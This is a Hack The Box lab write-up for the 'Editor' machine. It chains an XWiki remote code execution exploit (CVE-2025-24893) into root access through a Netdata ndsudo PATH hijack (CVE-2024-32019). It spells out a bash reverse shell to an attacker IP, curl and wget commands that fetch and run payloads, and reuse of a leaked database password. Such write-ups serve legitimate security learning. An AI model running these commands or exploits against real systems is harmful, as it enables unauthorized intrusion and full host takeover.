# HTB: Editor

**Target IP:** 10.10.11.80
**OS:** Linux
**Difficulty:** *(add rating)*

---

## 1. Reconnaissance

### Nmap
```bash
sudo nmap -sS -sV -Pn -O 10.10.11.80
sudo nmap -sC -sV -Pn -O 10.10.11.80
sudo nmap -sC -sV -p- 10.10.11.80 -v
```

**Open ports:**
| Port | Service | Version |
|---|---|---|
| 22 | ssh | OpenSSH 8.9p1 (Ubuntu) |
| 80 | http | nginx 1.18.0 (Ubuntu) — "SimplistCode Pro" |
| 8080 | http | XWiki |

### Virtual hosting
The site didn't resolve properly without a hosts entry:
```bash
echo '10.10.11.80 editor.htb' | sudo tee -a /etc/hosts
```

Port 80 hosts a **SimplistCode Pro** landing page. Port 8080 (accessed directly via IP:port, not through the vhost) hosts an **XWiki** instance, which is where SimplistCode Pro is distributed from.

---

## 2. Vulnerability Identification

The XWiki page footer disclosed the version: **XWiki Debian 15.10.8**. This version is vulnerable to **CVE-2025-24893**, an unauthenticated remote code execution vulnerability in XWiki's Solr search functionality (via the `SolrSearch` macro/wiki syntax injection).

Cloned a public PoC:
```bash
git clone https://github.com/gunzf0x/CVE-2025-24893
```

---

## 3. Exploitation — CVE-2025-24893 (XWiki RCE)

### Confirming code execution
```bash
python3 CVE-2025-24893.py -t 'http://10.10.11.80:8080/' -c 'curl http://10.10.17.88:8081'
```
(with a local Python HTTP server listening on `8081` to catch the callback)

The target issued outbound GET requests to the listener, confirming command injection was working.

### Reverse shell
Staged a reverse shell payload (`execute.sh`, based on the standard PentestMonkey bash one-liner):
```bash
bash -i >& /dev/tcp/10.10.17.88/9001 0>&1
```

Delivery chain:
```bash
python3 CVE-2025-24893.py -t 'http://10.10.11.80:8080' \
  -c 'curl http://10.10.17.88:8081/execute.sh -o /dev/shm/execute.sh && chmod +x /dev/shm/execute.sh && bash /dev/shm/execute.sh'
```

> **Troubleshooting notes:**
> - The `execute.sh` file needs to live in the same directory the Python HTTP server is being run from, or the download will 404.
> - Confirm the file actually landed in `/dev/shm/` on the target (via a separate `curl -v ... -o /dev/shm/execute.sh` test) before assuming the injection itself is broken — in this case the payload delivery was fine, but the script's callback IP was stale from testing and needed to be corrected to the actual VPN/tun0 address before the shell would connect back.

With a listener running (`nc -lvnp 9001`), the corrected payload delivered a working reverse shell as:
```
xwiki@editor:/usr/lib/xwiki-jetty$
```

---

## 4. Post-Exploitation — Finding Oliver's Credentials

Basic enumeration as `xwiki`:
```bash
whoami   # xwiki
id
ls -la
```

Explored the XWiki install directory structure (`/usr/lib/xwiki-jetty` → `webapps` → up to `/usr/lib/xwiki` → `WEB-INF`). Inside `WEB-INF`, found a Hibernate configuration file containing a database connection string:

```bash
cat hibernate.cfg.xml | grep password
```

This leaked a password: `theEd1t0rTeam99`.

Checked `/home` for a matching local user:
```bash
ls -al /home
```

Found user **`oliver`**. An initial `su oliver` attempt from within the reverse shell session failed (and briefly dropped the shell entirely, requiring the exploit chain to be re-run). Switched to a clean SSH session instead:

```bash
ssh oliver@10.10.11.80
```

Authenticated successfully with `theEd1t0rTeam99`.

```bash
ls
cat user.txt
```

**User flag captured.** ✅

---

## 5. Privilege Escalation — CVE-2024-32019 (ndsudo / Netdata)

### Enumeration
```bash
sudo -l          # oliver has no sudo rights
find / -user root -perm -4000 -print 2>/dev/null
```

The SUID search turned up `ndsudo`, a helper binary bundled with **Netdata**. Cross-referencing GTFOBins and further research identified **CVE-2024-32019**: a local privilege escalation in `ndsudo` caused by an untrusted search path (`PATH` hijacking) when it shells out to hardware-info utilities like `arcconf`, `nvme`, etc.

Found a public PoC:
```
https://github.com/juanbelin/CVE-2024-32019-POC
```

### Building the malicious binary
On the attacker machine, compiled the PoC's `arcconf.c` (a stand-in binary that `ndsudo` will invoke with root privileges due to the unsanitized `PATH`):

```bash
gcc arcconf.c -o arcconf
```

Served it via a local HTTP server and pulled it down on the target:
```bash
# target, in /tmp
wget http://10.10.17.88:8081/arcconf
chmod +x arcconf
```

### Exploiting the PATH hijack
```bash
export PATH=/tmp/:$PATH
echo $PATH
```

`ndsudo` looks for specific hardware-utility binary names on `PATH` depending on which subcommand is invoked (e.g. `arcconf-pd-info`, `nvme`). The malicious binary needs to be renamed to match whichever helper name is being targeted:

```bash
mv arcconf arcconf-pd-info
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo arcconf-pd-info
```

> **Troubleshooting notes:**
> - Naming matters exactly — a stray `.` instead of `-` (`arcconf.pd-info` vs `arcconf-pd-info`) causes `ndsudo` to report the helper as "Not available in PATH," which looks identical to a PATH-order failure and can send you chasing the wrong problem.
> - The single most costly mistake: forgetting to `chmod +x` the binary **immediately after every re-download**. `wget` doesn't preserve execute bits, and a non-executable file dropped in `/tmp` produces the same "Not available in PATH" error as a naming mismatch — it's worth checking `ls -la` on the file before re-testing the exploit each time.

Once the binary was correctly named (`arcconf-pd-info`) **and** executable, running:
```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo arcconf-pd-info
```
triggered `ndsudo` to execute the malicious binary as root instead of the legitimate system utility.

**Result:** Root shell.

```bash
cat /root/root.txt
```

**Root flag captured.** ✅

---

## Summary of Attack Chain

1. Recon identifies SSH (22), a static site (80), and an XWiki instance (8080)
2. XWiki version fingerprint (15.10.8) maps to **CVE-2025-24893** (unauthenticated RCE)
3. PoC confirms command injection, then delivers a staged reverse shell → foothold as `xwiki`
4. Enumeration of the XWiki install finds a database password in `hibernate.cfg.xml`
5. Password reuse against local user `oliver` via SSH → **user flag**
6. SUID enumeration finds `ndsudo` (Netdata), vulnerable to **CVE-2024-32019** (PATH hijack)
7. A malicious binary is placed in `/tmp`, added to `PATH`, and renamed to match the helper `ndsudo` invokes
8. `ndsudo` executes the malicious binary as root → **root flag**

## Key Takeaways
- **Version banners are free intel.** The XWiki footer directly named the vulnerable version, cutting straight to a known CVE rather than requiring blind fuzzing.
- **Application config files are a reliable credential source.** ORM/Hibernate configs routinely contain plaintext DB credentials that get reused for OS-level accounts — always worth a `grep -i pass` sweep after landing a shell.
- **PATH-hijack SUID/sudo vulnerabilities are exacting about naming and permissions.** Both the exact filename `ndsudo` expects to find on `PATH` and the executable bit on the dropped binary have to be correct simultaneously — errors from either cause the identical, unhelpful "not available in PATH" message, which makes root-causing slower than it needs to be. Double-checking with `ls -la` before each retest saves real time.
- Reverse shells over unstable RCE chains are fragile — testing file delivery independently (`curl -v -o` to confirm the file actually landed) before assuming the whole exploit chain is broken isolates problems faster.
